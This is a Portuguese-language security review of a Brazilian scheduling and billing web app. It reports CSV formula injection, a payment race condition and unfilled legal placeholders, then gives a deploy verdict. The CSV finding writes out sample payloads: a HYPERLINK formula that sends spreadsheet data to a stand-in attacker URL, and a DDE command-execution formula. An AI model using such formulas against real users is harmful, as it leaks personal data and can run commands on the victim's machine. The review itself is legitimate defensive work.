# Revisão incremental de segurança — 2026-09-29

Escopo: tudo commitado **depois** de `f6618c0` (correções da revisão anterior,
`docs/seguranca/revisao-2026-09-28.md`) até `c930994` (HEAD em `main` no momento desta
revisão):

```
c930994 feat(admin): dados jurídicos da operadora, CPF/CNPJ obrigatório no cadastro, gerar Pix pela empresa, backend de Cobrança e Saúde
6d8a4b3 feat(ui): visual premium onda 2 (...) CPF/CNPJ no cadastro e em Configurações
977ca88 feat(ui): visual premium onda 1 (Agendamentos, Clientes, Serviços, Profissionais, WhatsApp)
f3e0295 docs: README, manual do cliente e runbook de operação
4a616fc feat(billing): Mercado Pago alinhado ao Parque das Feiras (...)
b065a1e feat(legal): Termos de Uso e Política de Privacidade (LGPD)
25afb3a docs: plano de implementação até o lançamento
3035b11 feat(ui): pacotes premium (skeletons, microinterações, avatares, arrastar para remarcar, Ctrl+K)
b69cb92 / 3e3c5a3 docs: progresso consolidado
71a53c4 feat(ui): protótipo premium (shell, topbar + Ctrl+K, Início)
ad35ced feat(clientes): gestão de clientes (lista, ficha, pausa do bot, LGPD, CSV) e preços dos planos
a81199b docs(design): especificação da fusão premium
ece2a30 test(e2e): sessão reaproveitada por papel
5751546 fix(ui): diálogo de sucesso no 1º WhatsApp, reenviar e-mail
3c63770 feat(signup): reenviar e-mail de confirmação
05ccada test: E2E das telas novas, CSP e WhatsApp; fix: link de redefinição de senha
14191c3 feat(n8n): innochat-cron chama maintenance/tick diariamente (LGPD)
31f8701 chore: memória da Lyra (fase 3)
```

Verificado antes de auditar código novo: os dois achados **Alta** da revisão anterior já foram
corrigidos e continuam corrigidos —

- Login (`src/lib/auth.ts` → `src/modules/auth/service.ts#verifyCredentials`) agora chama
  `checkRateLimit` para `login:ip:<ip>` e `login:email:<email>` dentro de `authorize()`.
- `next.config.ts` tem `headers()` com CSP, `X-Frame-Options`, HSTS, `X-Content-Type-Options`,
  `Referrer-Policy` e `Permissions-Policy`. Não existe `unsafe-eval` em produção (só em dev) — os
  builds com `recharts`, `framer-motion` e `@dnd-kit` **não precisam** de `unsafe-eval` (nenhuma
  dessas libs usa `eval`/`new Function` para o que é usado aqui); a CSP usa `unsafe-inline` em
  `script-src`/`style-src` por decisão documentada (Next sem nonce), o que já era conhecido.

## CRÍTICO

Nenhum achado crítico.

## IMPORTANTE

### 1. Injeção de fórmula CSV na exportação de clientes (`exportContactsCsvAction`)

- **Onde:** `src/modules/contacts/contacts.ts:370-375` (`csvEscape`) e `:394-407`
  (`exportContactsCsv`), usado por `src/modules/contacts/actions.ts:104-109`.
- **Cenário:** `csvEscape` só trata aspas/`;`/quebra de linha (escapa para o CSV não quebrar
  estruturalmente) — não neutraliza um valor que **começa** com `=`, `+`, `-`, `@` ou tab/CR,
  que Excel/LibreOffice/Google Sheets interpretam como fórmula ao abrir o arquivo. `displayName`
  (primeira coluna do CSV) cai em `pushName` quando o cliente não tem `name` cadastrado pelo
  dono (`computeDisplayName`, `contacts.ts:88-93`) — e `pushName` é o nome de perfil do WhatsApp
  do CONTATO, gravado por `src/modules/bot-api/claim.ts:104-107` a partir do que a Evolution
  reporta, ou seja, **controlado por qualquer pessoa que mande mensagem no WhatsApp da empresa**,
  sem qualquer validação de conteúdo.
- **Impacto:** um contato define o nome de perfil do WhatsApp como algo como
  `=HYPERLINK("http://atacante/roubo?d="&A2,"clique")` ou `=cmd|'/c calc'!A0` (Excel legado com
  DDE); quando o OWNER exporta e abre o CSV no Excel, o programa avalia a "fórmula" — pode vazar
  dados de outras células (nome/telefone de outros clientes) para uma URL do atacante, ou (em
  configurações antigas do Excel com DDE habilitado) executar comando no SO do dono da empresa.
  Ataque clássico CSV Injection (OWASP), aqui com vetor de entrada externo e não autenticado (o
  WhatsApp do atacante nunca passa por login).
- **Correção:** em `csvEscape` (ou em `toListItem`/antes de montar `lines`), se o valor começar
  com `=`, `+`, `-`, `@`, tab (`\t`) ou CR (`\r`), prefixar com um apóstrofo (`'`) ANTES de
  aplicar o escape de aspas atual — padrão OWASP CSV Injection ("neutralize special characters").
  Aplicar a todas as colunas que carregam texto vindo de fora (`displayName`, e não seria demais
  aplicar em qualquer string livre exportada no futuro).

### 2. Corrida em `markInvoicePaidManually` pode aplicar o pagamento manual duas vezes

- **Onde:** `src/modules/billing/admin-service.ts:345-379`.
- **Cenário:** a auditoria (`ProviderEvent(provider="manual")`) só é criada **depois** de chamar
  `applyInvoicePayment` — diferente do webhook (`webhook.ts`), que cria o `ProviderEvent` (ou
  detecta a violação de unicidade) **antes** de aplicar o pagamento, exatamente para serializar
  concorrência. Se o admin clicar duas vezes rápido (ou duas abas), duas chamadas conseguem
  passar pela checagem `invoice.status === "PAID"` (leitura antes do lock de `UPDATE`) e ambas
  executam `applyInvoicePayment` — cada uma soma 1 mês a `currentPeriodEnd`, avançando o ciclo em
  2 meses para 1 pagamento só. Janela estreita (só quando as duas chamadas se sobrepõem
  literalmente em milissegundos) e restrita a um admin já confiável — por isso não é crítico,
  mas é uma diferença real de robustez frente ao próprio padrão que o código documenta e aplica
  no webhook.
- **Correção:** inverter a ordem, igual ao `webhook.ts`: criar/tentar criar o
  `ProviderEvent(provider="manual", providerEventId=invoiceId)` primeiro (capturando
  `isUniqueViolation` como "já em processamento/processado"), só então chamar
  `applyInvoicePayment`. Ou, mais simples: fazer o `UPDATE` de `Invoice`/`Subscription` dentro de
  `applyInvoicePayment` condicionado a `WHERE status = 'OPEN'` (Prisma:
  `updateMany({ where: { id, status: "OPEN" } })` e checar `count === 0` → já processado) em vez
  de `SELECT` + `UPDATE` incondicional.

### 3. Dados jurídicos cadastrados pelo admin nunca chegam às páginas públicas `/termos` e `/privacidade`

- **Onde:** `src/modules/platform/legal-service.ts#getPublicLegalInfo` +
  `src/core/legal/placeholders.ts#fillLegalPlaceholders` existem e têm teste unitário
  (`src/core/legal/__tests__/placeholders.test.ts`), mas **nenhuma das duas páginas as chama** —
  `src/app/(public)/termos/page.tsx` e `.../privacidade/page.tsx` passam `TERMOS_INTRO`/
  `TERMOS_SECTIONS` (e o par de Privacidade) direto para `<LegalDocument>`, sem passar pelo
  `fillLegalPlaceholders`.
- **Cenário/impacto:** o texto-fonte (`termos-content.ts`, `privacidade-content.ts`) tem os
  marcadores literais `[CNPJ]`, `[ENDEREÇO]`, `[E-MAIL DE CONTATO]`,
  `[E-MAIL DO ENCARREGADO/DPO]`, `[NOME DO ENCARREGADO]` no texto — e é exatamente esse texto,
  sem substituição, que vai para a página pública hoje. Ou seja: mesmo depois do admin preencher
  o formulário de "Dados jurídicos" (`updatePlatformLegalInfo`), a página pública de Termos e a
  de Privacidade continuam mostrando os colchetes literais em vez do CNPJ/endereço/e-mail do
  encarregado (DPO) reais. Isso não é uma vulnerabilidade de injeção (não é um usuário mal-
  intencionado explorando algo — é uma funcionalidade que não foi ligada), mas é um problema de
  conformidade real: a LGPD exige que o titular consiga identificar o controlador e contatar o
  encarregado a partir do próprio aviso de privacidade, e hoje esse aviso não entrega essa
  informação.
- **Correção:** nas duas páginas, buscar `getPublicLegalInfo()` (Server Component, já é
  `cache()`) e passar o resultado por `fillLegalPlaceholders` em cada string de `intro`/`blocks`
  antes de montar `sections`/`intro` que vão para `<LegalDocument>`.
- **Nota de segurança correlata (não um achado, só documentando a análise):** mesmo depois de
  ligar isso, não há risco de XSS/link `javascript:` via dado do admin — `fillLegalPlaceholders`
  substitui o marcador `[MARCADOR]` inteiro por texto puro (nunca insere um novo `[rótulo](url)`
  sintaticamente válido, porque o `[` de abertura já é consumido na substituição), e
  `legal-document.tsx#renderInline` só interpreta `**negrito**`/`` `código` ``/`[rótulo](url)`
  vindos do texto-fonte estático (escrito pelo dev), nunca do valor substituído. Os campos
  jurídicos (CNPJ, endereço, e-mail de contato/DPO) sendo públicos está correto e esperado —
  é exatamente o que a LGPD pede que seja publicado.

## SUGESTÃO

### 4. `exportContactsCsvAction` sem rate limit nem registro de auditoria

- **Onde:** `src/modules/contacts/actions.ts:104-109`.
- Só `OWNER` pode chamar (correto), mas não há `checkRateLimit` nem qualquer registro de "quem
  exportou os dados pessoais de todos os clientes, quando" — hoje o projeto não tem nenhuma
  tabela/mecanismo de audit log genérico (confirmado: nenhum `AuditLog`/`auditLog` em `src/`),
  então isto não é uma regressão desta rodada, é uma lacuna que já existia. Como é uma exportação
  em massa de dado pessoal (nome, telefone, histórico de agendamento) sob LGPD, vale registrar
  como dívida: um mecanismo de audit log (mesmo que simples, tipo `ProviderEvent`) cobrindo esta
  e outras ações sensíveis (ex.: `deleteContactAction`, `markInvoicePaidManuallyAction` já tem via
  `ProviderEvent`) ajudaria a responder "quem viu os dados de quem" se um dia for perguntado.
  Não bloqueia deploy.

### 5. Cursor de paginação de Clientes é OFFSET codificado em base64, não um keyset real

- **Onde:** `src/lib/db/contact-queries.ts` / `src/modules/contacts/contacts.ts:112-131`.
- Já documentado no próprio código como risco aceito (pode pular/repetir uma linha sob
  inserção/remoção concorrente, nunca vaza dado de outro tenant). Confirmo a análise: correto,
  sem risco de segurança, só UX marginal. Nenhuma ação necessária.

## Confirmações positivas (sem achado)

- **Clientes / SQL cru:** `contact-queries.ts` interpola todo valor (`tenantId`, busca, filtros de
  data) via `${}` dentro de `Prisma.sql`/`$queryRaw` — nenhuma concatenação de string, mesma
  garantia de prepared statement. Isolamento por tenant confirmado em toda função de
  `contacts.ts` (via `forTenant(tenantId)` ou `WHERE c."tenantId" = ${tenantId}` na query crua).
  `deleteContact` anonimiza corretamente (preserva histórico de `Appointment`, zera PII, marca
  `waJid` com prefixo reconhecido em toda a base) quando há agendamentos; deleta de fato quando
  não há.
- **Mercado Pago:** CPF/CNPJ do pagador nunca aparece em log ou mensagem de erro (só `tenantId`
  é logado nos casos de documento inválido); os erros `MERCADOPAGO_*` (`MISSING_DOCUMENT`,
  `MISCONFIGURED`, `UNAVAILABLE`) não permitem enumerar nada sensível — são só "falta documento
  da empresa" / "credencial da plataforma errada" / "MP fora do ar", sem detalhe de terceiro.
  `merchant_order`/tipos que não são `payment` são explicitamente ignorados sem reconsultar o MP
  (`webhook.ts:76-79`). `notification_url` é resolvida por requisição via `getPublicBaseUrl()` e
  nunca derruba a criação do Pix se não houver como resolvê-la. Verificação de assinatura HMAC
  com tolerância de replay de 10 min e `timingSafeEqual`, sem mudança desde a última revisão.
- **Admin → Cobrança:** `markInvoicePaidManually` restrito a `requirePlatformAdmin`, motivo
  obrigatório (`min(3)`), auditoria via `ProviderEvent(provider="manual")` (ver achado
  IMPORTANTE #2 sobre a ordem de criação). Filtros/cursor de `listInvoicesAdmin`/`listCompanies`
  sempre paginados, sem `findMany` sem `take`.
- **Admin → Saúde:** `getPlatformHealthAction`/`getIntegrationsHealth` só atrás de
  `requirePlatformAdmin`; nenhum segredo bruto sai em `detalhe`/log dos testes de conexão
  (`connection-tests.ts` — só status HTTP/tipo de erro, mensagem de exceção real vai só para
  `logger.warn`, nunca para a resposta ao client); cache de 60s é só para reduzir chamadas de
  rede, não expõe nada por si.
- **Cadastro:** `document` (CPF/CNPJ) obrigatório e validado (`validateCpfCnpj`) antes de gravar;
  `termsVersion` do client é **conferida** contra a constante `TERMS_VERSION` do servidor
  (`assertCurrentTermsVersion`) e o valor persistido é sempre a constante do servidor, nunca o do
  client — mesmo já validados iguais. Rate limit de 5 cadastros/hora por IP.
- **`regenerateMyInvoicePixAction`:** escopo por `findOwnInvoiceOrThrow(tenant.id, invoiceId)` —
  não deixa regerar Pix de fatura de outra empresa. Rate limit de 5 tentativas/10min por tenant.
- **Frontend novo:** a remarcação por arrastar (`agenda-client.tsx` + `@dnd-kit`) chama
  `rescheduleAppointmentAction`, que passa por `requireTenantMember` + `assertTenantCanWrite` +
  `rescheduleAppointment` (que revalida prazo mínimo, replaneja via `planBooking` — horário de
  trabalho, conflito de agenda — e tem `EXCLUDE` constraint como backstop contra corrida) — o
  cliente NUNCA decide o novo horário sem essa revalidação. `?novo=1` em Agenda/Clientes só abre
  um diálogo local (`useEffect` + `searchParams.get`), sem side-effect de servidor. A paleta
  Ctrl+K (`command-palette.tsx`) não renderiza HTML de entrada do usuário — a busca só filtra uma
  lista fixa de ações/telas em memória, navegação via `router.push` para hrefs fixos.
- **`npm audit --omit=dev`:** mesmas 6 vulnerabilidades ALTA já conhecidas da revisão anterior —
  `deepmerge-ts` (via `prisma`/`@prisma/config`, DoS por stack exhaustion) e `nodemailer` (via
  `next-auth`→`@auth/core`, 6 avisos incluindo SSRF/leitura de arquivo). Nada novo desde
  2026-09-28; correção continua não-bloqueante (exige upgrade major do Prisma e do Nodemailer,
  testar em janela própria).

## Veredito de deploy

**Liberado para deploy** com uma condição prática: a Injeção de fórmula CSV (IMPORTANTE #1) tem
vetor de entrada **não autenticado** (qualquer contato do WhatsApp da empresa) e efeito sobre a
máquina do dono da empresa que abrir a exportação — deveria ser corrigida antes do primeiro OWNER
real usar "Exportar CSV" em produção, mas não bloqueia o deploy em si (a feature pode ficar fora
até a correção, ou a correção (poucas linhas em `csvEscape`) pode entrar antes do lançamento
comercial). Os outros dois achados IMPORTANTE (corrida na baixa manual, marcadores jurídicos não
substituídos) são baixa probabilidade/impacto e podem ser corrigidos na sequência normal.

## Aprendizados registrados na memória

- Novo padrão de vulnerabilidade do projeto: **dado de fora do tenant (WhatsApp `pushName`, sem
  validação) chegando a uma exportação/exibição sem neutralização de fórmula CSV** — registrar
  como referência para qualquer export futuro (relatórios, backups) que inclua texto de contato.
- Padrão de idempotência do projeto (`ProviderEvent` como lock por unicidade) só é seguro contra
  corrida quando o registro de auditoria é criado **antes** de aplicar o efeito (webhook faz
  certo; a ação manual do admin inverteu a ordem) — vale checar essa ordem em qualquer ação nova
  que reutilize `ProviderEvent` como trava.
- Confirmado (não é achado novo): funcionalidade implementada e testada
  (`fillLegalPlaceholders`/`getPublicLegalInfo`) mas nunca "ligada" na página que deveria
  consumi-la — vale, numa próxima revisão de qualquer área, grepar por que uma função exportada e
  testada não tem nenhum import fora de teste.
